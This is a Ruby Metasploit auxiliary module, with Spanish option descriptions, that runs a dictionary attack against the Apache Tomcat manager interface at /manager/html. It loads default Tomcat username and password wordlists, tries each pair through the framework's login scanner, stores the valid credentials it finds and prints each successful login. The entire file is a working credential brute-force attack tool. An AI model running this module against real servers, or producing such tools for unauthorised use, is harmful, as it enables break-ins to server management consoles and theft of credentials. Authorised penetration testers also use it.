require 'msf/core'
 
class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner


def initialize
        super(
        'Name'   => 'Diccionary Attack to tomcat.',
        'Version'        => '$Revision: 0 $',
        'Description'    => 'Modulo para realizar ataque de diccionario a tomcat.',
        'Author' => 'Jonathan Soto',
        'License' => MSF_LICENSE
        )
 
        register_options(
        [
        Opt::RPORT(8080),
        OptString.new('USERNAME', [false, 'Nombre de usuario', '']),
        OptString.new('PASSWORD', [false, 'Contraseña', '']),
        OptString.new('TARGETURI', [true, "URI del manager de tomcat [default /manager/html]", "/manager/html"]),
        OptPath.new('USER_FILE',  [ false, "Archivo con usuarios",
          File.join(Msf::Config.data_directory, "wordlists", "tomcat_mgr_default_users.txt") ]),
        OptPath.new('PASS_FILE',  [ false, "Archivo con contraseñas",
          File.join(Msf::Config.data_directory, "wordlists", "tomcat_mgr_default_pass.txt") ]),
        ], self.class)
end
 
def run_host(ip)
        begin
      uri = normalize_uri(target_uri.path)
      res = send_request_cgi({
        'uri'     => uri,
        'method'  => 'GET',
        'username' => Rex::Text.rand_text_alpha(8)
        }, 25)
      http_fingerprint({ :response => res })
    rescue ::Rex::ConnectionError => e
      vprint_error("http://#{rhost}:#{rport}#{uri} - #{e}")
      return
    end

    if not res
      vprint_error("http://#{rhost}:#{rport}#{uri} - No response")
      return
    end
    if res.code != 401
      vprint_error("http://#{rhost}:#{rport} - Authorization not requested")
      return
    end

    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS'],
    )

        cred_collection = prepend_db_passwords(cred_collection)

    scanner = Metasploit::Framework::LoginScanner::Tomcat.new(
      configure_http_login_scanner(
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 10,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword']
      )
    )
    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
      else
        invalidate_login(credential_data)
        if result.proof
          vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
        else
          vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})"
        end
      end
    end
end
 
end
